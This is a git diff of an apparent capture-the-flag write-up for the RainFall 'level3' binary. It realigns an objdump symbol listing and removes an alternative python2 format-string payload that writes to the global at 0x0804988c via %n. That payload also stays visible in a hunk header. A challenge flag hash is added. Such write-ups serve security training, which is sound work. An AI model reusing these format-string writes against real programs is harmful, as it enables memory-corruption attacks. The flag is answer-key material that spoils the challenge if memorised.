@@ -18,15 +18,15 @@ level3:     file format elf32-i386
 08048654 l    d  .eh_frame      00000000              .eh_frame
 0804974c l    d  .dynamic       00000000              .dynamic
 00000000 l    d  .comment       00000000              .comment
-08049884 l     O .bss   00000001              completed.6159
-08048480 l     F .text  00000000              frame_dummy
+08049884 l     O .bss           00000001              completed.6159
+08048480 l     F .text          00000000              frame_dummy
 08048734 l     O .eh_frame      00000000              __FRAME_END__
 0804974c l     O .dynamic       00000000              _DYNAMIC
-00000000       F *UND*  00000000              system@@GLIBC_2.0
-00000000  w      *UND*  00000000              __gmon_start__
-00000000       F *UND*  00000000              __libc_start_main@@GLIBC_2.0
-0804988c g     O .bss   00000004              m
-0804851a g     F .text  0000000d              main
+00000000       F *UND*          00000000              system@@GLIBC_2.0
+00000000  w      *UND*          00000000              __gmon_start__
+00000000       F *UND*          00000000              __libc_start_main@@GLIBC_2.0
+0804988c g     O .bss           00000004              m
+0804851a g     F .text          0000000d              main
 level3@RainFall:~$
 ```
 
@@ -79,11 +79,6 @@ python2 -c 'print "\x8c\x98\x04\x08" + "%x "*3 + "a"*38 + "%n"' > /var/crash/wri
 
 </details>
 
-
-We can also substitute the `49u` and instead print 38 a, which will produce the same result!
-
-```bash
-python2 -c 'print "\x8c\x98\x04\x08" + "%x "*3 + "a"*38 + "%n"' > /var/crash/write
-```
+## Flag
 
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
